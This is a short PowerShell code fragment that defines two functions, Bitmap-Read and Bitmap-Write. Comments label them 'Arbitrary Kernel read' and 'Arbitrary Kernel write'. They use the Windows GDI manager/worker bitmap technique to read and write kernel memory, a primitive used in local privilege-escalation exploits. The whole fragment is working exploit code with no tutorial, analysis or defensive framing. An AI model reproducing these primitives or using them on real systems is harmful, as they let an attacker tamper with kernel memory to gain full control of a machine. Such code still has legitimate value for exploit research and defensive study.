# Assumes IntPtr size r/w, modify as nessesary!

# Arbitrary Kernel read
function Bitmap-Read {
    param ($Address)
    $CallResult = [GDI32]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
    [IntPtr]$Pointer = [Kernel32]::VirtualAlloc([System.IntPtr]::Zero, [System.IntPtr]::Size, 0x3000, 0x40)
    $CallResult = [GDI32]::GetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, $Pointer)
	if ($x32Architecture){
    	[System.Runtime.InteropServices.Marshal]::ReadInt32($Pointer)
	} else {
		[System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer)
	}
    $CallResult = [Kernel32]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000)
}

# Arbitrary Kernel write
function Bitmap-Write {
    param ($Address, $Value)
    $CallResult = [GDI32]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address))
    $CallResult = [GDI32]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value))
}